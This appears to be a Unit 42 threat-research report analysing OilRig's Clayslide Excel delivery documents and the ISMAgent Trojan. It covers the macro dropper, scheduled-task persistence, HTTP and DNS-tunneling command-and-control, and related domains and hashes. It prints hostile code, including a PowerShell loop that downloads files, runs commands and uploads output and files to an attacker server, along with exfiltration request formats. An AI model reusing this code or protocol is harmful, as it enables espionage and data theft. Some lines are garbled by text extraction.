Symantec first reported on this�](https://www.symantec.com/connect/blogs/greenbug-cyberespionage-group-targeting-middle-east-possible-links-shamoon)**\n**group back in January 2017, detailing their operations and using a custom information**\n**stealing Trojan called ISMDoor.**\n\n**In July 2017, we observed an attack on a Middle Eastern technology organization that was**\n**also targeted by the OilRig campaign in August 2016. Initial inspection of this attack**\n**suggested this was again the OilRig campaign using their existing toolset, but further**\n**[examination revealed not only new variants of the delivery document we named Clayslide, but](https://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/)**\n**also a different payload embedded inside it. In the past, we had primarily associated the�**\n**OilRig campaign with using the Clayslide documents to deliver as a payload a Trojan we**\n**named Helminth; in this instance, the payload was instead a variant of the ISMDoor Trojan**\n**with significant modifications which we are now tracking as ISMAgent.�**\n\n### The Attack\n\n**On July 16, 2017, actors associated with the OilRig campaign sent emails to five different�**\n**individuals within the targeted organization. All of the emails sent had the same subject,**\n**attachment filename, and attached Excel file (SHA256:�**\n**3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6).**\n\n**We identified the Excel file attached to the delivery email as a variant of the Clayslide delivery�**\n**documents used by the OilRig campaign. A closer look revealed that although it was similar**\n**to previous Clayslide documents, it was also quite different in several aspects. Like the�**\n**previous samples, it displays a worksheet titled “Incompatible” containing a banner that**\n**shows a fake compatibility warning message (Figure 1). The message is an attempt to trick**\n**the user into clicking the “Enable Content” button, which would run a malicious macro**\n**embedded within the Excel file�**\n\n\n-----\n\n**The macro within the delivery document will unhide and display a new worksheet that**\n**contains a fake invoice for Citrix products, as seen in Figure 2. This fake invoice acts as a**\n**decoy document to minimize the user’s suspicions that any malicious activity occurred.**\n\n**_Figure 2 Decoy document opened to minimize suspicions of compromise_**\n\n**While the macro displays the decoy invoice spreadsheet, it silently runs malicious code in the**\n**background to install its payload. The malicious code starts by concatenating several base64**\n**encoded strings into a single variable. As you can see in the following code snippet, the**\n**variable name “Paltofp1” suggests that the author of this code may want our attention:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n\n\n**Paltofp1 = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"**\n**Paltofp1 = Paltofp1 + \"AAAAAAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4**\n**Paltofp1 = Paltofp1 + \"ZGUuDQ0KJAAAAAAAAAAtSGbjaSkIsGkpCLBpKQiw3bX5sGUpCLDdtfuw5ykIsN21+rB**\n**Paltofp1 = Paltofp1 + \"sGgpCLCMcAuxeikIsIxwDbFLKQiwjHAMsXgpCLBgUZuweCkIsGkpCbAHKQiwm3ABsWg**\n**Paltofp1 = Paltofp1 + \"aCkIsJtwCrFoKQiwUmljaGkpCLAAAAAAAAAAAFBFAABMAQUAEphZWQAAAAAAAAAA4AA**\n\n**[..snipped..]**\n\n\n**The macro then writes the concatenated base64 encoded data to the file�**\n**%PUBLIC%\\Libraries\\B642.txt. It then reads in the “B642.txt” file and decodes the data,�**\n**which it will save to the file %PUBLIC%\\Libraries\\servicereset.exe (SHA256:�**\n**52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9). The**\n**servicereset.exe file is the payload of this attack, which is a variant of ISMDoor that we track�**\n**as ISMAgent.**\n\n**The script then creates a file named %PUBLIC%\\Libraries\\OfficeServicesStatus.vbs which�**\n**contains a VBScript that will execute the “servicereset.exe” file using the command line.�**\n**Lastly, as a persistence mechanism, a scheduled task named “OfficeServicesStatus” will be�**\n**created, set to run every three minutes, as seen in Figure 3.**\n\n\n-----\n\n**_Figure 3 Scheduled task created by the macro within the delivery document_**\n\n### An Iterative Task\n\n**While hunting for other samples similar to the one observed in the attack against the**\n**technology organization, we discovered yet another variant of Clayslide (SHA256:**\n**5ac939a5426db8614165bd8b6a02d3e8d9f167379c6ed28025bf3b37f1aea902). This sample**\n**was dated June 2017, a month older than the newest version containing ISMAgent. Based**\n**upon timestamping and similarities with both the original Clayslide documents as well as the**\n**newest ISMAgent loaded ones, we believe this June 2016 sample to be an iterative version of**\n**Clayslide.**\n\n**The June 2017 sample of Clayslide contained the same OfficeServicesStatus.vbs file found in�**\n**the ISMAgent Clayslide document, but instead of having the payload embedded in the macro**\n**as segregated base64 strings that would be concatenated, this variant obtained its payload**\n**from multiple cells within the “Incompatible” worksheet. This technique was observed in**\n**previous Clayslide documents to access the script variant of the Helminth Trojan in earlier**\n**OilRig attacks.**\n\n**Also, the June 2017 sample contained artifacts observed in previous Clayslide documents as**\n**[documented in a blog post we published in April. Specifically, we found this comment:�](https://researchcenter.paloaltonetworks.com/2017/04/unit42-oilrig-actors-provide-glimpse-development-testing-efforts/)**\n\n\n**1** **source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.**\n\n\n**along with the following common function names within the macro code:**\n\n\n**1**\n**2**\n**3**\n**4**\n\n\n**Private** **Sub Workbook_Open()**\n**Call fireeye_Init**\n**Call fireeye_ShowHideSheets**\n**End** **Sub**\n\n\n**Although structurally the document was more similar to the originally discovered Clayslide**\n**documents, this June 2017 sample was designed to load ISMAgent instead of Helminth. We**\n**do not have targeting details for this sample, although the decoy document contained a**\n**similar theme to the newest Clayslide document, displaying vendor related information (Figure**\n**4).**\n\n\n-----\n\n**_Figure 4 Decoy document_**\n\n**A table displaying the differences in each variant of Clayslide is below:�**\n\n**Original** **June** **Newest**\n**Clayslide** **Clayslide** **Clayslide**\n\n**Helminth** **X**\n\n**ISMAgent** **X** **X**\n\n**OfficeServicesStatus�** **X** **X**\n\n**Base64 in multiple** **X** **X**\n**cells**\n\n**Source code** **X** **X**\n**comment**\n\n**_Table 1 Comparison of Clayslide versions_**\n\n**The payload (SHA256:**\n**52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9) delivered in**\n**the June 2016 attack is a variant of the recent ISMDoor versions that use DNS tunneling for**\n**[its C2 communications. On May 1, 2017, Arbor Networks published research on ISMDoor](https://www.arbornetworks.com/blog/asert/greenbugs-dns-isms/)**\n**using DNS tunneling to communicate with its C2 server, which is nearly identical to the DNS**\n**tunneling the payload of this attack carries out. Due to considerable differences and evidence�**\n**of potentially different authors between the previous ISMDoor samples and this newly�**\n\n|Col1|Original Clayslide|June Clayslide|Newest Clayslide|\n|---|---|---|---|\n|Helminth|X|||\n|ISMAgent||X|X|\n|OfficeServicesStatus�||X|X|\n|Base64 in multiple cells|X|X||\n|Source code comment|X|X||\n\n\n-----\n\n### On-demand Configuration�\n\n**The ISMAgent tool comes with a default configuration that specifies the C2 domain and the�**\n**number of minutes between further attempts to execute the tool. However, an actor can use**\n**command line arguments to create a new ISMAgent sample that is configured with a�**\n**specified C2 domain and a specified number of minutes to automatically execute the Trojan.�**\n**The following command line arguments are supported:**\n\n**Argument** **Description**\n\n**-c** **Configures a second domain to use for C2 communications�**\n\n**-m** **Configures the number of minutes that a scheduled task should�**\n**execute the payload**\n\n**_Table 2 Command line options available in ISMAgent for configuration�_**\n\n**If the Trojan is executed with these arguments, the Trojan will read its own file data in, and�**\n**search for two strings of characters within the data that it will overwrite with the configured�**\n**settings. The Trojan searches for a string of “^” characters that it will overwrite with the C2**\n**domain provided via the “-c” argument, and it searches for the string “%%%%” that it will**\n**replace with the number of minutes provided via the “-m” argument. The “%%%%” string**\n**exists within the following larger string, that the Trojan uses as a command to execute in order**\n**to create a scheduled task named “TimeUpdate” to execute the payload after the specified�**\n**number of minutes passes:**\n\n**1** **cmd /c** **schtasks /query /tn TimeUpdate &gt;** **NUL** **2&gt;&amp;1 || schtasks /create /sc minute /**\n\n### Command and Control\n\n**The Trojan is able to use two mechanisms to communicate with its C2 server: HTTP requests**\n**and DNS tunneling. The DNS tunneling protocol found in this payload is remarkably similar to**\n**[recent ISMDoor samples, as documented in Arbor Networks’ research. Similar message](https://www.arbornetworks.com/blog/asert/greenbugs-dns-isms/)**\n**handling is found in both ISMAgent and ISMDoor, in addition to the existence of strings in**\n**both samples, such the hardcoded IPv6 values. The similarities may allow for backward**\n**compatibility between ISMAgent and ISMDoor C2 infrastructure. In the payloads themselves,**\n**a number of differences exist, enough that in essence they appear to be different tools.�**\n\n**Regardless of the communications method used, the Trojan will parse the received data from**\n**the C2 server for a GUID field that the Trojan will use as a unique identifier, as well as�**\n**commands the Trojan should run on the compromised system:**\n\n**1** **[GUID provided by C2]#command#[URL to download file to system]#[command to execute via cmd**\n\n|Argument|Description|\n|---|---|\n|-c|Configures a second domain to use for C2 communications�|\n|-m|Configures the number of minutes that a scheduled task should� execute the payload|\n\n\n### HTTP C2 Communications\n\n**ISMAgent prioritizes HTTP as its mechanism to communicate with the C2 server, but if it is**\n**unable to reach the C2 server it will switch to the DNS tunneling mechanism. To carry out its**\n**HTTP C2 communications, the Trojan prepends “www.” to the configured C2 domain and�**\n**issues a DNS query to resolve this domain. The Trojan will use the resolved IP address as the**\n**host in the HTTP beacon request.**\n\n**For instance, the sample used in this attack was configured to use ntpupdateserver[.]com for�**\n**its C2 server. The HTTP C2 process would attempt to resolve the domain**\n\n\n-----\n\n**server using a URL structured in the following way:**\n\n\n**1** **http://[IP of C2 domain]/action2/[base64 encoded hostname\\username]**\n\n\n**The C2 server will respond to this request with a command string using the previously**\n**mentioned format. During the attack on the technology organization, we observed the C2**\n**server issuing the following command:**\n\n**1** **2983b983-0acd-42db-9d86-0b096af5f369#command##systeminfo &amp;&amp; ipconfig /all &amp;&am**\n\n**If the C2 server provides a command to execute on the system, the Trojan executes it using**\n**cmd.exe and writes the output to %TEMP%\\runlog[random number].tmp. The Trojan will read**\n**this runlog file and send it to the C2 server via an HTTP POST request to a URL structured as�**\n**follows:**\n\n**1** **http://[IP of C2 domain]/response/[base64 encoded hostname\\username]/[GUID provided by C2]**\n\n\n**The HTTP POST request contains an anomalous boundary value of “myboundary” and**\n**hardcoded filename value of “a.a”, as seen below, which may be used to generate detection�**\n**signatures for this behavior:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n\n\n**POST /response/[redacted]/2983b983-0acd-42db-9d86-0b096af5f369** **HTTP/1.1**\n**Host: 142.54.179.90**\n**Content-Type: multipart/form-data;** **boundary=myboundary**\n**User-Agent: Firefox**\n**Content-Length: 3868**\n**Cache-Control: no-cache**\n\n**--myboundary**\n**Content-Type: application/octet-stream;charset=UTF-8**\n**Content-Disposition: form-data;** **name=\"file\";** **filename=\"a.a\"**\n\n**[output of command prompt]**\n\n\n**While we did not observe the C2 server attempting to run additional commands via**\n**ISMAgent, we were able to analyze the Trojan itself to determine the functionality of its**\n**available commands. If the command string contains a URL to download a file to the system,�**\n**the Trojan will simply use the URLDownloadToFileA function to download and save the file to�**\n**the target system in the %TEMP% folder. If the C2 server provides a path to a file it wishes to�**\n**upload from the system, the Trojan will open the file, read its contents, and then upload its�**\n**contents via an HTTP POST to the following URL:**\n\n\n**1** **http://[IP of C2 domain]/upload/[base64 encoded hostname\\username]/[GUID provided by C2]**\n\n\n### DNS Tunneling for C2\n\n**ISMAgent uses its DNS tunneling technique for C2 as a backup to its HTTP capability. This**\n**mechanism supports the same command message structure and even handles the**\n**commands in the same manner. The Trojan sends data to the C2 server via DNS queries by**\n**encoding data and using the encoded string as a subdomain of an actor owned domain. The**\n**C2 server can send data to the Trojan by resolving the DNS queries to IPv6 addresses that the**\n**Trojan treats as hexadecimal data.**\n\n**To carry out its DNS C2 communications, the Trojan will issue DNS queries to the C2 domain**\n**to obtain the AAAA records associated with the domain. The Trojan starts this process by**\n**creating a unique GUID and appending it to the string “n.n.c.” to create a subdomain to query**\n**i** **th** **f ll** **i** **f** **t**\n\n\n-----\n\n**(** **p p** **)**\n\n\n**To respond to this beacon, the C2 domain’s name server will respond to this query with a**\n**hardcoded IPv6 value of a67d:0db8:a2a1:7334:7654:4325:0370:2aa3. This value acts as an**\n**acknowledgement of the beacon. The Trojan will then base64 encode the HTTP C2 URL it**\n**was using and will send this data to the C2 by constructing and issuing the following DNS**\n**query:**\n\n\n**1**\n**2**\n\n\n\n**[base64 encoded data].[iterating sequence number].d.[session value based on GUID].[c2 doma**\n**(ex: aHR0cDovLzE0M.0.d.303E5CF0A861479B80E2.ntpupdateserver.com)**\n\n\n**The Trojan splits up the base64 encoded data across several DNS queries, which we believe**\n**the C2 domain’s name server pieces together using the supplied sequence numbers. The**\n**name server will respond to each of these DNS queries with another hardcoded IPv6 value of**\n**a67d:0db8:85a3:4325:7654:8a2a:0370:7334 to notify the Trojan that it has received the data.**\n**After all of the data is successfully sent via DNS requests, the Trojan will send a final DNS�**\n**query that has the following structure to notify the C2 server that it has completed its data**\n**transfer:**\n\n\n**1**\n**2**\n\n\n**n.[iterating sequence number].f.[session value based on GUID].[c2 domain]**\n**(ex: n.8.f.303E5CF0A861479B80E2.ntpupdateserver.com)**\n\n\n**After notifying the C2 server that the data transfer has completed, the Trojan may issue**\n**additional DNS queries to notify it is ready to receive data back from the C2 server using the**\n**following domain name structure:**\n\n\n**1** **www.[iterating sequence number].r.[session value based on GUID].[c2 domain]**\n\n\n**The DNS server will then respond to these DNS queries with additional IPv6 addresses that**\n**the Trojan will treat as hexadecimal data as described by Arbor Networks.**\n\n### Infrastructure\n\n**The ISMAgent payload embedded inside the newest variant of Clayslide used the C2 domain**\n**ntpupdateserver[.]com. The primary second-level domain has no IP resolution, instead relying**\n**on www.ntpupdateserver[.]com for resolution then two specific subdomains of�**\n**ns1.ntupdateserver[.]com and ns2.ntpupdateserver[.]com as the actual DNS C2 handler. The**\n**ISMAgent payload embedded inside the June version used a completely different C2 domain�**\n**at Microsoft-publisher[.]com, but used the exact same domain name structure. Lastly, we**\n**were able to identify a third sample of ISMAgent leveraging another unique C2 domain,**\n**adobeproduct[.]com.**\n\n\n**1**\n**2**\n**3**\n\n\n**Ntpupdateserver[.]com**\n**Microsoft-publisher[.]com**\n**Adobeproduct[.]com**\n\n\n-----\n\n**_Figure 5 Primary C2 domains for ISMAgent_**\n\n**Pivoting from the WHOIS registrant email address of paul.mcalister[at]mail.com revealed four**\n**additional highly suspect domains:**\n\n\n**1**\n**2**\n**3**\n**4**\n\n\n**fireeyeupdate[.]com**\n**chrome-dns[.]com**\n**tatavpnservices[.]com**\n**miedafire[.]com**\n\n\n**Pivoting on the WHOIS phone number we found two additional domains. These are registered**\n**with the same Registrar, have the same WHOIS address, but the registrant name**\n**“bolips Angelio” and email address bolips[at]outlook.com.**\n\n\n**1**\n**2**\n\n\n**cache-service[.]net**\n**level3-resolvers[.]net**\n\n\n**Thematically, these domains follow the pattern of ISMAgent and OilRig C2 domain names,**\n**abusing typo-squatting techniques in attempts to appear as legitimate domains. Each of**\n**these additional domains had the same structure as the three ISMAgent C2 domains, with no**\n**IP resolution on the primary second-level domain containing the www, ns1, and ns2**\n**subdomains. Based off the same registrant email address and domain name structure, it is�**\n**highly probable these other domains are also part of the ISMAgent infrastructure as C2**\n**servers.**\n\n**Lastly, we identified another ISMAgent sample using the C2 domain of adobeproduct[.]com,�**\n**which again fits thematically and was also found to have the www, ns1, and ns2 subdomains�**\n**attached to it.**\n\n**These findings are diagrammed below:�**\n\n\n-----\n\n**_Figure 6 ISMAgent C2 Infrastructure_**\n\n### ISMAgent vs. ISMDoor\n\n**On the surface, the ISMAgent payload appears similar to the ISMDoor payload, sharing**\n**functionality such as a specific DNS tunneling protocol. However, closer analysis shows there�**\n**are enough differences between the two payloads that justifies tracking ISMAgent as its own�**\n**tool with its own name.**\n\n**First, all known ISMDoor payloads using DNS tunneling were created for 64-bit architectures,**\n**while all known ISMAgent are x86 only. The most recent ISMDoor payloads using DNS**\n**tunneling have abandoned HTTP as a C2 communications method compared to earlier**\n**ISMDoor samples, whereas ISMAgent uses HTTP as the primary method and DNS tunneling**\n**as a secondary method to communicate with its C2 server.**\n\n**Also, while the DNS tunneling protocol is the same, the messages within the transmitted**\n**encoded data differs dramatically. After the initial “n.n.c.” beacon, ISMAgent sends the HTTP�**\n**C2 URL as the data via the DNS tunneling protocol to send a beacon to its C2. During our**\n**analysis, we observed the sample used in this attack sending the following data immediately**\n**after the initial beacon:**\n\n\n**1** **http://142.54.179[.]90/action2/T0tPODczODAyNTg1NTk4XDVoNkdkTjY5YTR0S0g%3d||**\n\n\n**Comparatively, ISMDoor sends a much more involved series of messages to the C2 server in**\n**order to get a command. The following is a sequence of messages sent from the ISMDoor**\n**Trojan to its C2 server via the DNS tunneling protocol, the last message (“M:GAC?”) resulting**\n**in a command for the Trojan to run:**\n\n\n-----\n\n**3**\n**4**\n**5**\n\n\n**pp** **p;** **g** **y**\n**3.** **M:AV?appId=-1&amp;uniqueId=00000000-0000-0000-0000-000000000000**\n**4.** **M:AV?appId=[appId provided by C2]&amp;uniqueId=[GUID provided by C2]**\n**5.** **M:GAC?appId=[appId provided by C2]**\n\n\n**Lastly, the commands available within ISMAgent and ISMDoor are very different. As�**\n**mentioned previously, ISMAgent has a far more limited, but flexible command set, allowing an�**\n**adversary to upload and download files, in addition to command execution via command�**\n**prompt. The most recent version of ISMDoor (v 10.0.192 SHA256:**\n**aa52dcaf6df43c6aa872fe0f73725f61e082d32c33fc976741d4eca17679533d) on the other**\n**hand, has a more comprehensive yet more rigid command set:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n\n\n**ChangeAliveSeconds**\n**ChangeAddress**\n**SI**\n**GetConfig**\n**RunNewVersion**\n**restart**\n**remove**\n**FastAlive**\n**ExecuteKL**\n**GetVersion**\n**PauseUpload**\n**ResumeUpload**\n**PauseDownload**\n**ResumeDownload**\n**PWS**\n**ImmediateResetRam**\n\n\n### From Helminth to ISMAgent\n\n**During our data collection process, we discovered a Clayslide delivery document (SHA256:**\n**ca8cec08b4c74cf68c71a39176bfc8ee1ae4372f98f75c892706b2648b1e7530) from**\n**September 2016 containing a payload that appeared to be the Helminth script variant as**\n**found in other Clayslide documents, but upon further examination was wholly different. The�**\n**macro within this Clayslide documents obtains a PowerShell script from a cell in the**\n**“Incompatible” worksheet, much like previous samples. The macro then saves a VBScript to**\n**%PUBLIC%\\Libraries\\LicenseCheck.vbs to run this PowerShell script every 3 minutes.**\n\n**Like the Helminth script variants, this PowerShell script is a malicious payload that uses both**\n**HTTP requests and DNS tunneling to interact with its C2 server. However, the HTTP requests**\n**and the protocol employed to perform DNS tunneling differs dramatically from Helminth�**\n**scripts installed by all other known Clayslide samples. The HTTP requests and DNS tunneling**\n**protocol found in this PowerShell script are instead identical to ISMAgent.**\n\n**The C2 domain used for this script was mslicensecheck[.]com, which had previously been**\n**[reported by LogRhythm in their OilRig whitepaper. Interestingly, it was the only domain](https://www.content.shi.com/SHIcom/ContentAttachmentImages/SharedResources/PDFs/lr-041017-oilrig-report2.pdf)**\n**associated with OilRig that did not have an IP resolution at its second-level, much like the**\n**ISMAgent samples.**\n\n**The “doIt” function within the PowerShell script, seen in Figure 7, is responsible for initiating**\n**the C2 communications, as well as parsing the data provided by the C2 server to run the**\n**appropriate commands. This function uses the strings “/action2/”, “/response/” and**\n**“/upload/” within the C2 URLs when using HTTP to communicate with the C2 server. This**\n**behavior and these strings were also observed in the ISMAgent C2 behavior. The “doIt”**\n**function also shows that the C2 server will respond with data structured the same way as**\n\n\n-----\n\n**command to execute using command-prompt, and offset 4 specifying a path to a file to�**\n**upload to the C2 server.**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n**17**\n**18**\n**19**\n**20**\n**21**\n**22**\n**23**\n**24**\n\n\n**function** **doIt(){**\n**try{**\n**while($true){**\n**$res = get($ha+\"/action2/\"+$id)**\n**$p = $res.split('#')**\n**if** **($p.Length -lt** **5)** **{** **break** **}**\n**$res = $tmp+$p[0]**\n**$u = $ha+\"/response/\"+$id+\"/\"+$p[0]**\n**if** **($p[2] -ne** **'')** **{**\n**$name= $p[2].SubString($p[2].LastIndexOf(\"/\")+1)**\n**download** **$p[2]** **($tmp+$name)**\n\n**[IO.File]::WriteAllText($res,\"done\",** **[System.Text.Encoding]::Unicode)**\n**}**\n**if($p[3] -ne** **''){**\n**$p[3] | cmd.exe &gt;&gt;** **$res**\n**}**\n**if($p[4] -ne** **''){**\n**upload** **$u.Replace(\"/response/\",\"/upload/\")** **$p[4]**\n**}**\n**upload** **$u** **$res**\n\n**[IO.File]::Delete($res)**\n**}**\n**}** **catch** **{}**\n**}**\n\n\n**_Figure 7 The ‘doIt’ function within the PowerShell script handles C2 interaction and_**\n**_functionality_**\n\n**The commonalities between this PowerShell script and ISMAgent do not stop there. The**\n**HTTP requests to the C2 server use the exact same URL structure. For instance, the payload**\n**generates a URL using the following line of code, which results in a base64 encoded string**\n**that contains [hostname/username]:**\n\n**1** **$id=[Convert]::ToBase64String($Enc.GetBytes([System.Net.Dns]::GetHostEntry([string]\"localho**\n\n**Also, as seen in the code above, the PowerShell script makes sure the base64 encoded data**\n**used is safe to use in an HTTP URL, by replacing the characters “=”, “/” and “+” characters**\n**with hexadecimal equivalent. The ISMAgent payloads also performed the exact same**\n**replacement, as seen in the portion of code in Figure 8.**\n\n\n-----\n\n**_Figure 8 Code within ISMAgent payload that overlaps character replacement HTTP_**\n**_communications functionality within PowerShell script_**\n\n**The DNS tunneling protocol within the PowerShell script is the same as the ISMAgent**\n**payload, which can be visualized by the following beacon sent from the PowerShell script:**\n\n\n**1** **n.n.c.55957d20569c43c9a401e5d446b92b9e.mslicensecheck.com**\n\n\n**To facilitate the DNS tunneling functionality, the PowerShell script replaces the “=”, “/” and**\n**“+” characters within the base64 data sent to the C2 server within the subdomains of DNS**\n**queries. However, DNS queries cannot include the “%” character, so it uses the following line**\n**of code to replace them with “-“, “-s-“ and “-p-“ instead:**\n\n\n**1** **$b64=[Convert]::ToBase64String($dt).Replace('=','-').Replace(\"/\",\"-s-\").Replace(\"+\",\"-p-\")**\n\n\n**This functionality is again replicated within the ISMAgent payload for its DNS tunneling**\n**functionality, as shown in Figure 9.**\n\n\n-----\n\n**_Figure 9 Code within ISMAgent payload that overlaps character replacement within DNS_**\n**_tunneling functionality within PowerShell script_**\n\n### Conclusion\n\n**The OilRig campaign has repeatedly demonstrated a willingness and desire to be iterative in**\n**their toolset, while maintaining some level of similarities over time. In this scenario, we were**\n**able to directly observe this type of behavior, while also implement a tool thought to be**\n**previously unrelated to OilRig. With the inclusion of ISMAgent within the OilRig toolset, we are**\n**beginning to see stronger relationships between the various documented groups operating in**\n**the Middle East. This region has proven to be a hot bed of espionage motivated activity over**\n**the last couple of years, and there appear to be no signs of this changing. As our research**\n**continues, our goal will be to generate even better understandings of the true extent of the**\n**various operations in this region and the relationships between them.**\n\n**Palo Alto Networks customers are protected and may learn more via the following:**\n\n**S** **l** **l** **ifi d** **li i** **b WildFi** **d T** **t th i** **ti** **�**\n\n\n-----\n\n**[AutoFocus users may learn more via the ISMAgent and Clayslide tags](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ISMAgent)**\n\n### Indicators of Compromise\n\n**Clayslide delivering ISMAgent**\n\n**3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6**\n**5ac939a5426db8614165bd8b6a02d3e8d9f167379c6ed28025bf3b37f1aea902**\n\n**ISMAgent payloads**\n**bbfc05177e5e29b3c8c4ef0148969d07e6239140da5bff57473c32409e76c070�**\n**52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9**\n**af4d8604d0cd09b8dc01dbafc33c6d240d356cad366f9917192a2725e0121a0d**\n\n**ISMAgent C2**\n**Adobeproduct[.]com**\n**ntpupdateserver[.]com**\n**microsoft-publisher[.]com**\n\n**Related infrastructure**\n\n**Miedafire[.]com�**\n**tatavpnservices[.]com**\n**chrome-dns[.]com**\n**fireeyeupdate[.]com�**\n**cache-service[.]net**\n**level3-resolvers[.]net**\n**Mslicensecheck[.]com**\n\n### Got something to say?\n\n\n**Leave a comment...**\n\n\n**Notify me of followup comments via e-**\n**mail**\n\n\n**Name (required)**\n\n\n-----\n\n**Website**\n\n\n**SUBMIT**\n\n\n**SUBSCRIBE TO NEWSLETTERS**\n\n**Email**\n\n**COMPANY**\n\n**[Company](https://www.paloaltonetworks.com/company)**\n\n**[Careers](https://www.paloaltonetworks.com/company/careers)**\n\n**[Sitemap](https://www.paloaltonetworks.com/sitemap)**\n\n**[Report a Vulnerability](https://www.paloaltonetworks.com/security-disclosure)**\n\n**LEGAL NOTICES**\n\n**[Privacy Policy](https://www.paloaltonetworks.com/legal-notices/privacy)**\n\n**[Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use)**\n\n**ACCOUNT**\n\n**[Manage Subscription](https://www.paloaltonetworks.com/company/subscriptions)**\n\n**© 2016 Palo Alto Networks, Inc.
